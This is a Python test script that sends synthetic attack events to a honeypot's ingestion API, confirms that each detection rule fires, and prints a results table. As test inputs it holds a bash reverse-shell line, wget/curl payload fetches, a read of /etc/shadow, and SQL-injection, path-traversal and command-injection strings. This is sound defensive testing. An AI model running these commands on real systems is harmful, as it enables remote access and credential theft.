"""Exercise every deterministic rule through authenticated live ingestion."""

import os
import time
import uuid
from datetime import UTC, datetime

import httpx


API = os.getenv("VALIDATION_API_URL", "http://127.0.0.1:8000")
SENSOR_KEY = os.environ["SENSOR_API_KEY"]
CLIENT = httpx.Client(base_url=API, timeout=10, trust_env=False)


def ingest(*, source_ip: str, protocol: str = "SSH", event_type: str = "COMMAND", command: str | None = None,
           user_agent: str | None = None, payload: dict | None = None, session_id: str | None = None) -> dict:
    event_id = str(uuid.uuid4())
    response = CLIENT.post(
        "/api/v1/ingest/events",
        headers={"X-Sensor-Key": SENSOR_KEY},
        json={
            "event_id": event_id,
            "timestamp": datetime.now(UTC).isoformat(),
            "source_ip": source_ip,
            "source_port": 41000,
            "destination_port": 8080 if protocol == "HTTP" else 2222,
            "protocol": protocol,
            "honeypot": protocol,
            "session_id": session_id or str(uuid.uuid4()),
            "event_type": event_type,
            "command": command,
            "user_agent": user_agent,
            "payload": payload or {"node_name": "native-validation"},
        },
        timeout=10,
    )
    response.raise_for_status()
    return response.json()


def result_for(rule_id: str, response: dict) -> dict:
    detection = next(item for item in response["event"]["detections"] if item["rule_id"] == rule_id)
    return {
        "rule": rule_id,
        "triggered": "YES",
        "score": detection["score"],
        "severity": response["event"]["severity"],
        "incident": "YES" if response["incident_id"] else "NO",
        "alert": "YES" if response["alert_id"] else "NO",
        "status": "PASS",
    }


def main() -> None:
    rows: list[dict] = []
    command_cases = [
        ("SSH-CMD-WGET", "wget http://127.0.0.1:9/payload"),
        ("SSH-CMD-CURL", "curl http://127.0.0.1:9/payload"),
        ("SSH-CMD-CHMOD", "chmod 777 /tmp/payload"),
        ("SSH-CMD-REVERSE_SHELL", "bash -i >& /dev/tcp/127.0.0.1/9 0>&1"),
        ("SSH-CMD-SCRIPT_EXEC", "python -c 'print(1)'"),
        ("CRED-ACCESS-001", "cat /etc/shadow"),
    ]
    for index, (rule, command) in enumerate(command_cases, start=10):
        rows.append(result_for(rule, ingest(source_ip=f"198.51.100.{index}", command=command)))

    web_cases = [
        ("WEB-SQLI-001", "/search?id=1%20OR%201=1--", "browser/native"),
        ("WEB-TRAV-001", "/..%2f..%2fetc/passwd", "browser/native"),
        ("WEB-CMDI-001", "/api/run?command=%3Bid", "browser/native"),
        ("WEB-UA-001", "/", "sqlmap/native-validation"),
    ]
    for index, (rule, target, agent) in enumerate(web_cases, start=30):
        response = ingest(
            source_ip=f"198.51.100.{index}",
            protocol="HTTP",
            event_type="HTTP_REQUEST",
            user_agent=agent,
            payload={"method": "GET", "path": target.split("?", 1)[0], "raw_target": target, "headers": {}, "body_size": 0, "response_code": 404},
        )
        rows.append(result_for(rule, response))

    scan_ip = "198.51.100.50"
    scan_response = None
    for _ in range(3):
        scan_response = ingest(
            source_ip=scan_ip,
            protocol="HTTP",
            event_type="HTTP_REQUEST",
            user_agent="browser/native",
            payload={"method": "GET", "path": "/admin", "raw_target": "/admin", "headers": {}, "body_size": 0, "response_code": 200},
        )
    assert scan_response
    rows.append(result_for("WEB-SCAN-001", scan_response))

    rate_ip = "198.51.100.60"
    rate_response = None
    for _ in range(30):
        rate_response = ingest(
            source_ip=rate_ip,
            protocol="HTTP",
            event_type="HTTP_REQUEST",
            user_agent="browser/native",
            payload={"method": "GET", "path": "/robots.txt", "raw_target": "/robots.txt", "headers": {}, "body_size": 0, "response_code": 200},
        )
    assert rate_response
    rows.append(result_for("WEB-RATE-001", rate_response))

    brute_ip = "198.51.100.70"
    brute_session = str(uuid.uuid4())
    brute_response = None
    for _ in range(5):
        brute_response = ingest(
            source_ip=brute_ip,
            event_type="LOGIN_FAILURE",
            session_id=brute_session,
            payload={"node_name": "native-validation"},
        )
    assert brute_response
    rows.append(result_for("AUTH-BRUTE-001", brute_response))

    print("| Detection | Triggered | Score | Severity | Incident | Alert | Status |")
    print("|---|---:|---:|---|---:|---:|---|")
    for row in rows:
        print("| {rule} | {triggered} | {score} | {severity} | {incident} | {alert} | {status} |".format(**row))
    time.sleep(8)
    CLIENT.close()


if __name__ == "__main__":
    main()
